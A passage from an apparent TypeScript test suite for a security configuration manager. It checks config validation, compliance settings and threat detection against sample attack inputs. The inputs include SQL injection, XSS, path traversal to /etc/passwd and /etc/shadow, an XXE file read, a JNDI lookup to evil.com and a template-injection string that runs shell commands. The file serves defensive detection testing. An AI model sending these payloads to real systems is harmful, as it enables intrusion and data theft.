      expect(report.recommendations).toBeDefined();
    });

    it('should check encryption at rest configuration', () => {
      const report = securityConfigManager.enforceBestPractices();
      expect(report.issues).toBeDefined();
      expect(report.recommendations).toBeDefined();
    });

    it('should check security headers configuration', () => {
      const report = securityConfigManager.enforceBestPractices();
      expect(report.issues).toBeDefined();
      expect(report.recommendations).toBeDefined();
    });

    it('should calculate overall security score', () => {
      const report = securityConfigManager.enforceBestPractices();
      
      if (report.passedChecks === report.totalChecks) {
        expect(report.score).toBe(100);
      } else if (report.passedChecks === 0) {
        expect(report.score).toBe(0);
      } else {
        const expectedScore = Math.round((report.passedChecks / report.totalChecks) * 100);
        expect(report.score).toBe(expectedScore);
      }
    });
  });

  describe('Configuration Validation', () => {
    it('should validate complete configuration', () => {
      const config = securityConfigManager.getConfig();
      const validation = securityConfigManager.validateConfig(config);
      
      expect(validation).toBeDefined();
      expect(validation.valid).toBeDefined();
      expect(validation.errors).toBeDefined();
    });

    it('should detect invalid session timeout', () => {
      const invalidConfig: SecurityConfig = {
        ...securityConfigManager.getConfig(),
        authentication: {
          ...securityConfigManager.getConfig().authentication,
          sessionTimeout: 2000 // Invalid: too high
        }
      };
      
      const validation = securityConfigManager.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Session timeout must be between 1 and 1440 minutes');
    });

    it('should detect invalid max login attempts', () => {
      const invalidConfig: SecurityConfig = {
        ...securityConfigManager.getConfig(),
        authentication: {
          ...securityConfigManager.getConfig().authentication,
          maxLoginAttempts: 15 // Invalid: too high
        }
      };
      
      const validation = securityConfigManager.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Max login attempts must be between 1 and 10');
    });

    it('should detect invalid encryption algorithm', () => {
      const invalidConfig: SecurityConfig = {
        ...securityConfigManager.getConfig(),
        encryption: {
          ...securityConfigManager.getConfig().encryption,
          algorithm: 'invalid-algorithm'
        }
      };
      
      const validation = securityConfigManager.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Invalid encryption algorithm');
    });

    it('should detect invalid rate limit configuration', () => {
      const invalidConfig: SecurityConfig = {
        ...securityConfigManager.getConfig(),
        rateLimiting: {
          ...securityConfigManager.getConfig().rateLimiting,
          maxRequests: 0 // Invalid: must be at least 1
        }
      };
      
      const validation = securityConfigManager.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Rate limit max requests must be at least 1');
    });

    it('should detect invalid deviation threshold', () => {
      const invalidConfig: SecurityConfig = {
        ...securityConfigManager.getConfig(),
        threatDetection: {
          ...securityConfigManager.getConfig().threatDetection,
          behavioralAnalysis: {
            ...securityConfigManager.getConfig().threatDetection.behavioralAnalysis,
            deviationThreshold: 10 // Invalid: too high
          }
        }
      };
      
      const validation = securityConfigManager.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors).toContain('Deviation threshold must be between 1 and 5');
    });

    it('should validate correct configuration', () => {
      const config = securityConfigManager.getConfig();
      const validation = securityConfigManager.validateConfig(config);
      
      // Configuration should be valid by default
      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);
    });
  });

  describe('Behavioral Analysis and Anomaly Detection', () => {
    it('should track behavioral metrics', () => {
      const config = securityConfigManager.getConfig();
      expect(config.threatDetection.behavioralAnalysis.enabled).toBe(true);
      expect(config.threatDetection.behavioralAnalysis.baselineWindow).toBeGreaterThan(0);
      expect(config.threatDetection.behavioralAnalysis.deviationThreshold).toBeGreaterThan(0);
    });

    it('should configure anomaly detection algorithms', () => {
      const config = securityConfigManager.getConfig();
      expect(['isolation-forest', 'statistical', 'ml-based']).toContain(
        config.threatDetection.anomalyDetection.algorithm
      );
      expect(config.threatDetection.anomalyDetection.sensitivity).toBeGreaterThanOrEqual(0);
      expect(config.threatDetection.anomalyDetection.sensitivity).toBeLessThanOrEqual(1);
    });

    it('should update behavioral baseline regularly', () => {
      const config = securityConfigManager.getConfig();
      expect(config.threatDetection.behavioralAnalysis.updateFrequency).toBeGreaterThan(0);
    });

    it('should configure metrics to track', () => {
      const config = securityConfigManager.getConfig();
      const metricsToTrack = config.threatDetection.behavioralAnalysis.metricsToTrack;
      
      expect(metricsToTrack).toContain('login_attempts');
      expect(metricsToTrack).toContain('requests_per_minute');
      expect(metricsToTrack).toContain('data_access_volume');
    });

    it('should configure threat response actions', () => {
      const config = securityConfigManager.getConfig();
      const responseActions = config.threatDetection.responseActions;
      
      expect(responseActions.length).toBeGreaterThan(0);
      
      responseActions.forEach(action => {
        expect(action.threatType).toBeDefined();
        expect(action.severity).toBeDefined();
        expect(action.actions).toBeDefined();
        expect(Array.isArray(action.actions)).toBe(true);
        expect(typeof action.autoBlock).toBe('boolean');
        expect(typeof action.alertAdmins).toBe('boolean');
      });
    });
  });

  describe('Security Audit and Compliance', () => {
    it('should configure audit logging', () => {
      const config = securityConfigManager.getConfig();
      expect(config.audit.enabled).toBe(true);
      expect(['minimal', 'standard', 'comprehensive']).toContain(config.audit.logLevel);
      expect(config.audit.retentionPeriod).toBeGreaterThan(0);
      expect(config.audit.realTimeAlerts).toBeDefined();
    });

    it('should configure audit log paths', () => {
      const config = securityConfigManager.getConfig();
      expect(config.audit.auditLogPaths).toBeDefined();
      expect(config.audit.auditLogPaths.length).toBeGreaterThan(0);
      expect(config.audit.auditLogPaths[0]).toContain('audit.log');
    });

    it('should configure compliance frameworks', () => {
      const config = securityConfigManager.getConfig();
      expect(config.audit.complianceFrameworks).toContain('SOC2');
      expect(config.audit.complianceFrameworks).toContain('ISO27001');
      expect(config.audit.complianceFrameworks).toContain('GDPR');
    });

    it('should perform audit actions', () => {
      const auditSpy = vi.spyOn(securityConfigManager as any, 'createSecurityEvent');
      
      securityConfigManager.auditAction('read', 'user_data', 'testuser', 'success');
      
      expect(auditSpy).toHaveBeenCalled();
    });

    it('should check for compliance violations', () => {
      const event = securityConfigManager.createSecurityEvent({
        type: SecurityEventType.AUTHENTICATION_FAILURE,
        severity: 'medium',
        source: 'test',
        description: 'Multiple authentication failures detected',
        metadata: { attempts: 10 }
      });
      
      // This would trigger compliance violation check in real implementation
      expect(event).toBeDefined();
    });

    it('should evaluate SOC2 compliance', () => {
      const config = securityConfigManager.getConfig();
      
      // SOC2 requires proper access controls and monitoring
      expect(config.authentication.maxLoginAttempts).toBeLessThanOrEqual(5);
      expect(config.audit.enabled).toBe(true);
      expect(config.monitoring.enabled).toBe(true);
    });

    it('should evaluate GDPR compliance', () => {
      const config = securityConfigManager.getConfig();
      
      // GDPR requires encryption and audit logging
      expect(config.encryption.enableAtRestEncryption).toBe(true);
      expect(config.encryption.enableTransitEncryption).toBe(true);
      expect(config.audit.enabled).toBe(true);
    });

    it('should evaluate ISO27001 compliance', () => {
      const config = securityConfigManager.getConfig();
      
      // ISO27001 requires comprehensive security controls
      expect(config.threatDetection.enabled).toBe(true);
      expect(config.monitoring.enabled).toBe(true);
      expect(config.audit.enabled).toBe(true);
      expect(config.audit.realTimeAlerts).toBe(true);
    });
  });

  describe('Security Monitoring and Metrics', () => {
    it('should configure security monitoring', () => {
      const config = securityConfigManager.getConfig();
      expect(config.monitoring.enabled).toBe(true);
      expect(['debug', 'info', 'warn', 'error']).toContain(config.monitoring.logLevel);
      expect(config.monitoring.metricsEnabled).toBe(true);
      expect(config.monitoring.alertingEnabled).toBe(true);
      expect(config.monitoring.dashboardEnabled).toBe(true);
    });

    it('should configure monitoring endpoints', () => {
      const config = securityConfigManager.getConfig();
      expect(config.monitoring.monitoringEndpoints).toContain('/health/security');
      expect(config.monitoring.monitoringEndpoints).toContain('/health/metrics');
      expect(config.monitoring.monitoringEndpoints).toContain('/health/audit');
    });

    it('should configure event handling', () => {
      const config = securityConfigManager.getConfig();
      expect(config.eventHandling.bufferSize).toBeGreaterThan(0);
      expect(config.eventHandling.batchSize).toBeGreaterThan(0);
      expect(config.eventHandling.retryAttempts).toBeGreaterThanOrEqual(0);
    });

    it('should configure event handlers', () => {
      const config = securityConfigManager.getConfig();
      expect(config.eventHandling.handlers.length).toBeGreaterThan(0);
      
      config.eventHandling.handlers.forEach(handler => {
        expect(handler.type).toBeDefined();
        expect(handler.config).toBeDefined();
        expect(handler.priority).toBeGreaterThanOrEqual(0);
      });
    });

    it('should handle security events through different handlers', () => {
      const config = securityConfigManager.getConfig();
      const handlerTypes = config.eventHandling.handlers.map(h => h.type);
      
      expect(handlerTypes).toContain('console');
      expect(handlerTypes).toContain('file');
      expect(handlerTypes).toContain('database');
    });

    it('should handle high priority event handlers first', () => {
      const config = securityConfigManager.getConfig();
      const handlers = config.eventHandling.handlers;
      
      // Console handler should have highest priority
      const consoleHandler = handlers.find(h => h.type === 'console');
      expect(consoleHandler?.priority).toBe(1);
    });
  });

  describe('Input Validation Policy', () => {
    it('should configure input validation rules', () => {
      const config = securityConfigManager.getConfig();
      const policy = config.policies.inputValidationPolicy;
      
      expect(policy.maxLength).toBeGreaterThan(0);
      expect(policy.allowedCharacters).toBeDefined();
      expect(policy.blockedPatterns).toBeDefined();
      expect(policy.sanitizationRules).toBeDefined();
    });

    it('should define maximum input length', () => {
      const config = securityConfigManager.getConfig();
      expect(config.policies.inputValidationPolicy.maxLength).toBe(10000);
    });

    it('should define allowed character patterns', () => {
      const config = securityConfigManager.getConfig();
      const allowedChars = config.policies.inputValidationPolicy.allowedCharacters;
      
      expect(allowedChars).toBeDefined();
      expect(allowedChars.length).toBeGreaterThan(0);
    });

    it('should define blocked patterns', () => {
      const config = securityConfigManager.getConfig();
      const blockedPatterns = config.policies.inputValidationPolicy.blockedPatterns;
      
      expect(blockedPatterns.length).toBeGreaterThan(0);
      
      // Should include XSS patterns
      const hasScriptPattern = blockedPatterns.some(pattern => 
        pattern instanceof RegExp && pattern.source.includes('script')
      );
      expect(hasScriptPattern).toBe(true);
    });

    it('should define sanitization rules for different field types', () => {
      const config = securityConfigManager.getConfig();
      const rules = config.policies.inputValidationPolicy.sanitizationRules;
      
      expect(rules.length).toBeGreaterThan(0);
      
      // Should have rules for email and password
      const emailRule = rules.find(r => r.field === 'email');
      const passwordRule = rules.find(r => r.field === 'password');
      
      expect(emailRule).toBeDefined();
      expect(passwordRule).toBeDefined();
    });
  });

  describe('Authorization and Access Control', () => {
    it('should configure default role', () => {
      const config = securityConfigManager.getConfig();
      expect(config.authorization.defaultRole).toBe('guest');
    });

    it('should define role permissions', () => {
      const config = securityConfigManager.getConfig();
      const roles = config.authorization.roles;
      
      expect(roles.admin).toBeDefined();
      expect(roles.user).toBeDefined();
      expect(roles.guest).toBeDefined();
    });

    it('should configure admin role with full permissions', () => {
      const config = securityConfigManager.getConfig();
      const adminRole = config.authorization.roles.admin;
      
      expect(adminRole.permissions).toContain('*');
      expect(adminRole.resourceAccess['*']).toContain('admin');
    });

    it('should configure user role with limited permissions', () => {
      const config = securityConfigManager.getConfig();
      const userRole = config.authorization.roles.user;
      
      expect(userRole.permissions).toContain('read');
      expect(userRole.permissions).toContain('write');
      expect(userRole.restrictions).toContain('no_admin_access');
    });

    it('should configure guest role with read-only access', () => {
      const config = securityConfigManager.getConfig();
      const guestRole = config.authorization.roles.guest;
      
      expect(guestRole.permissions).toContain('read');
      expect(guestRole.restrictions).toContain('no_authenticated_access');
    });

    it('should define permission configuration', () => {
      const config = securityConfigManager.getConfig();
      const permissions = config.authorization.permissions;
      
      expect(permissions.length).toBeGreaterThan(0);
      
      permissions.forEach(permission => {
        expect(permission.resource).toBeDefined();
        expect(permission.action).toBeDefined();
      });
    });
  });

  describe('Security Vulnerability Scanning', () => {
    it('should scan for common vulnerability patterns', () => {
      const vulnerabilityPatterns = [
        {
          name: 'SQL Injection',
          patterns: MALICIOUS_INPUTS.sqlInjection,
          expectedThreat: 'injection'
        },
        {
          name: 'XSS',
          patterns: MALICIOUS_INPUTS.xssPayloads,
          expectedThreat: 'xss'
        },
        {
          name: 'Path Traversal',
          patterns: MALICIOUS_INPUTS.pathTraversal,
          expectedThreat: 'traversal'
        },
        {
          name: 'Command Injection',
          patterns: MALICIOUS_INPUTS.commandInjection,
          expectedThreat: 'injection'
        }
      ];

      vulnerabilityPatterns.forEach(({ name, patterns, expectedThreat }) => {
        patterns.forEach(pattern => {
          const threats = securityConfigManager.analyzeThreats(pattern);
          const hasThreat = threats.some(threat => 
            threat.category === expectedThreat
          );
          expect(hasThreat).toBe(true).fail(`${name} pattern not detected: ${pattern}`);
        });
      });
    });

    it('should detect unknown vulnerability patterns', () => {
      const customMaliciousInputs = [
        'UNION SELECT username,password FROM admin_users',
        '<iframe src="javascript:alert(document.cookie)">',
        '../../../etc/shadow',
        '${7*7}',
        '#!/bin/bash\ncat /etc/passwd'
      ];

      customMaliciousInputs.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        expect(threats.length).toBeGreaterThan(0);
      });
    });

    it('should handle zero-day vulnerability attempts', () => {
      const novelAttacks = [
        // Prototype pollution attempt
        '__proto__.admin = true',
        'constructor.prototype.admin = true',
        
        // Server-side template injection
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        
        // NoSQL injection
        '{"$ne": null}',
        '{"$gt": ""}',
        
        // LDAP injection
        '*)(uid=*))(|(uid=*',
        
        // XXE attack
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
      ];

      novelAttacks.forEach(input => {
        const threats = securityConfigManager.analyzeThreats(input);
        // Should detect at least some of these patterns
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should create detailed security events for vulnerabilities', () => {
      const eventSpy = vi.spyOn(securityConfigManager, 'createSecurityEvent' as any);
      const vulnerability = "'; DROP TABLE users; --";
      
      securityConfigManager.analyzeThreats(vulnerability);
      
      expect(eventSpy).toHaveBeenCalledWith(expect.objectContaining({
        type: SecurityEventType.THREAT_DETECTED,
        severity: 'high',
        source: 'threat-detection',
        description: expect.stringContaining('Threat detected'),
        metadata: expect.objectContaining({
          patternName: expect.any(String),
          severity: 'high',
          category: 'injection'
        })
      }));
    });

    it('should handle multiple simultaneous vulnerability attempts', () => {
      const complexPayload = `
        <script>
          fetch('/api/users')
            .then(r => r.json())
            .then(data => {
              // SQL injection in data processing
              const query = "SELECT * FROM users WHERE id = " + data.userId;
              // XSS in DOM manipulation
              document.getElementById('output').innerHTML = data.content;
            });
        </script>
        '; DROP TABLE audit_logs; --
      `;
      
      const threats = securityConfigManager.analyzeThreats(complexPayload);
      
      expect(threats.length).toBeGreaterThan(0);
      
      const categories = threats.map(t => t.category);
      expect(categories).toContain('xss');
      expect(categories).toContain('injection');
    });
  });

  describe('Performance and Security Trade-offs', () => {
    it('should handle high-frequency security checks efficiently', () => {
      const startTime = Date.now();
      const iterations = 1000;
      
      for (let i = 0; i < iterations; i++) {
        securityConfigManager.analyzeThreats('normal input');
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should complete 1000 checks in reasonable time (less than 1 second)
      expect(duration).toBeLessThan(1000);
    });

    it('should handle concurrent threat detection requests', async () => {
      const promises: Promise<any>[] = [];
      
      for (let i = 0; i < 100; i++) {
        promises.push(Promise.resolve(
          securityConfigManager.analyzeThreats(`malicious input ${i}`)
        ));
      }
      
      const results = await Promise.all(promises);
      
      expect(results.length).toBe(100);
      results.forEach(result => {
        expect(Array.isArray(result)).toBe(true);
      });
    });

    it('should handle large input payloads efficiently', () => {
      const largeInput = 'A'.repeat(10000) + '<script>alert("xss")</script>';
      
      const startTime = Date.now();
      const threats = securityConfigManager.analyzeThreats(largeInput);
      const endTime = Date.now();
      
      expect(threats.length).toBeGreaterThan(0);
      expect(endTime - startTime).toBeLessThan(100); // Should process within 100ms
    });

    it('should handle rapid configuration updates', () => {
      const startTime = Date.now();
      const iterations = 100;
      
      for (let i = 0; i < iterations; i++) {
        securityConfigManager.updateConfig({
          monitoring: { logLevel: i % 2 === 0 ? 'info' : 'debug' } as any
        });
      }
      
      const endTime = Date.now();
      
      // Should handle 100 configuration updates efficiently
      expect(endTime - startTime).toBeLessThan(1000);
    });

    it('should handle memory efficiently during security scanning', () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Process many malicious inputs
      for (let i = 0; i < 1000; i++) {
        MALICIOUS_INPUTS.sqlInjection.forEach(input => {
          securityConfigManager.analyzeThreats(input);
        });
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
    });
  });

  describe('Integration with Express Application', () => {
    it('should provide security middleware functionality', () => {
      // Mock Express app setup
      const middlewareSpy = vi.spyOn(mockApp, 'use');
      
      // In real implementation, this would be applied to Express app
      expect(middlewareSpy).toHaveBeenCalledTimes(0); // No middleware applied yet
    });

    it('should integrate with request/response cycle', () => {
      const mockReq = {
        ...mockRequest,
        body: { username: 'test', password: 'TestPass123!' },
        headers: { 'user-agent': 'test-browser' }
      };
      
      const mockRes = {
        ...mockResponse,
        set: vi.fn(),
        status: vi.fn().mockReturnThis(),
        json: vi.fn()
      };
      
      // Test security checks in request processing
      const threats = securityConfigManager.analyzeThreats(JSON.stringify(mockReq.body));
      expect(Array.isArray(threats)).toBe(true);
    });

    it('should validate incoming headers', () => {
      const suspiciousHeaders = [
        'X-Forwarded-Host: evil.com',
        'X-Original-URL: /admin',
        'X-Rewrite-URL: /admin',
        'Cookie: admin=true; authenticated=1'
      ];
      
      suspiciousHeaders.forEach(header => {
        const threats = securityConfigManager.analyzeThreats(header);
        // Should detect suspicious headers
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should validate query parameters', () => {
      const maliciousQueries = [
        '/search?q=<script>alert("xss")</script>',
        '/search?q=\'; DROP TABLE users; --',
        '/search?q=../../../etc/passwd',
        '/search?q=${7*7}'
      ];
      
      maliciousQueries.forEach(query => {
        const threats = securityConfigManager.analyzeThreats(query);
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should validate request body content', () => {
      const maliciousBodies = [
        { content: '<script>alert("xss")</script>' },
        { username: "admin' OR '1'='1", password: 'password' },
        { file: '../../../etc/passwd' },
        { query: '${jndi:ldap://evil.com/a}' }
      ];
      
      maliciousBodies.forEach(body => {
        const threats = securityConfigManager.analyzeThreats(JSON.stringify(body));
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should handle file upload security', () => {
      const maliciousFileNames = [
        '../../../etc/passwd',
        'script<.php',
        'file%00.jpg',
        'test.jsp.jpg',
        '..\\..\\..\\windows\\system32\\config\\sam'
      ];
      
      maliciousFileNames.forEach(fileName => {
        const threats = securityConfigManager.analyzeThreats(fileName);
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });

    it('should validate JSON API requests', () => {
      const maliciousJsonRequests = [
        {
          username: '<script>alert("xss")</script>',
          email: 'test@example.com',
          bio: 'I am a hacker'
        },
        {
          query: 'SELECT * FROM users WHERE 1=1',
          filter: 'admin\'--'
        },
        {
          data: '${7*7}',
          payload: '{{constructor.constructor(\'return process\').mainModule.require(\'child_process\').execSync(\'whoami\').toString()}}'
        }
      ];
      
      maliciousJsonRequests.forEach(request => {
        const threats = securityConfigManager.analyzeThreats(JSON.stringify(request));
        expect(threats.length).toBeGreaterThanOrEqual(0);
      });
    });
  });

  describe('Security Configuration Export and Import', () => {
    it('should export configuration as JSON', () => {
      const exportedConfig = securityConfigManager.exportConfig();
      
      expect(exportedConfig).toBeDefined();
      expect(typeof exportedConfig).toBe('string');
      
      const parsed = JSON.parse(exportedConfig);
      expect(parsed).toHaveProperty('authentication');
      expect(parsed).toHaveProperty('authorization');
      expect(parsed).toHaveProperty('encryption');
      expect(parsed).toHaveProperty('policies');
    });

    it('should create custom configuration', () => {
      const customConfig = {
        authentication: {
          sessionTimeout: 45,
          maxLoginAttempts: 3,
          lockoutDuration: 20,
          requireMFA: true,
          passwordPolicy: {
            minLength: 14,
            maxLength: 128,
            requireUppercase: true,
            requireLowercase: true,
            requireNumbers: true,
            requireSpecialChars: true,
            preventCommonPasswords: true,
            preventReuse: 5,
            expiryDays: 45
          },
          jwtConfig: {
            secret: 'custom-secret',
            algorithm: 'HS256',
            expiresIn: '20m',
            refreshTokenExpiry: '10d',
            issuer: 'custom-app',
            audience: 'custom-users'
          }
        }
      };
      
      const customManager = SecurityConfigUtils.createCustomConfig(customConfig);
      expect(customManager).toBeInstanceOf(SecurityConfigManager);
      
      const config = customManager.getConfig();
      expect(config.authentication.sessionTimeout).toBe(45);
      expect(config.authentication.maxLoginAttempts).toBe(3);
    });

    it('should maintain configuration validation after export/import', () => {
      const exportedConfig = securityConfigManager.exportConfig();
      const parsedConfig = JSON.parse(exportedConfig);
      
      const validation = securityConfigManager.validateConfig(parsedConfig);
      expect(validation.valid).toBe(true);
    });

    it('should handle configuration updates via event emission', (done) => {
      securityConfigManager.on('configUpdated', (config: SecurityConfig) => {
        expect(config).toBeDefined();
        expect(config.authentication).toBeDefined();
        done();
      });
      
      securityConfigManager.updateConfig({
        authentication: { sessionTimeout: 90 } as any
      });
    });

    it('should handle threat detection updates via event emission', (done) => {
      securityConfigManager.on('threatDetectionUpdated', (config: any) => {
        expect(config).toBeDefined();
        expect(config.patterns).toBeDefined();
        done();
      });
      
      securityConfigManager.updateThreatDetection({
        enabled: false
      });
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('should handle empty threat patterns gracefully', () => {
      securityConfigManager.updateThreatDetection({
        patterns: []
      });
      
      const threats = securityConfigManager.analyzeThreats('<script>alert("xss")</script>');
      expect(threats).toEqual([]);
    });

    it('should handle disabled threat detection', () => {
      securityConfigManager.updateThreatDetection({
        enabled: false
      });
      
      const threats = securityConfigManager.analyzeThreats('<script>alert("xss")</script>');
      expect(threats).toEqual([]);
    });

    it('should handle null or undefined input', () => {
      expect(() => {
        securityConfigManager.analyzeThreats('');
      }).not.toThrow();
      
      expect(() => {
        securityConfigManager.analyzeThreats(null as any);
      }).not.toThrow();
      
      expect(() => {
        securityConfigManager.analyzeThreats(undefined as any);
      }).not.toThrow();
    });

    it('should handle extremely long input strings', () => {
      const longInput = 'A'.repeat(100000) + '<script>alert("xss")</script>';
      
      const threats = securityConfigManager.analyzeThreats(longInput);
      expect(threats.length).toBeGreaterThan(0);
    });

    it('should handle unicode and special characters', () => {
      const unicodeInputs = [
        '<script>alert("中文测试")</script>',
        'SELECT * FROM users WHERE name = "José";',
        'DROP TABLE 表名;',
        '<img src="😀" onerror="alert(\'😈\')">',
        'SELECT * FROM users WHERE id = 1; -- Ελληνικά'
      ];
      
      unicodeInputs.forEach(input => {
        expect(() => {
          const threats = securityConfigManager.analyzeThreats(input);
          expect(Array.isArray(threats)).toBe(true);
        }).not.toThrow();
      });
    });

    it('should handle concurrent security event creation', async () => {
      const promises: Promise<SecurityEvent>[] = [];
      
      for (let i = 0; i < 50; i++) {
        promises.push(Promise.resolve(
          securityConfigManager.createSecurityEvent({
            type: SecurityEventType.AUDIT_LOG_EVENT,
            severity: 'low',
            source: 'test',
            description: `Concurrent event ${i}`,
            metadata: {}
          })
        ));
      }
      
      const events = await Promise.all(promises);
      
      expect(events.length).toBe(50);
      events.forEach(event => {
        expect(event.id).toBeDefined();
        expect(event.timestamp).toBeDefined();
      });
    });

    it('should handle rapid configuration validation', () => {
      const startTime = Date.now();
      const iterations = 1000;
      
      for (let i = 0; i < iterations; i++) {
        const config = securityConfigManager.getConfig();
        securityConfigManager.validateConfig(config);
      }
      
      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(1000);
    });

    it('should handle memory cleanup properly', () => {
      // Create many security events
      for (let i = 0; i < 1000; i++) {
        securityConfigManager.createSecurityEvent({
          type: SecurityEventType.AUDIT_LOG_EVENT,
          severity: 'low',
          source: 'test',
          description: `Event ${i}`,
          metadata: { index: i }
        });
      }
      
      // Should cleanup without errors
      expect(() => {
        securityConfigManager.cleanup();
      }).not.toThrow();
    });
  });
});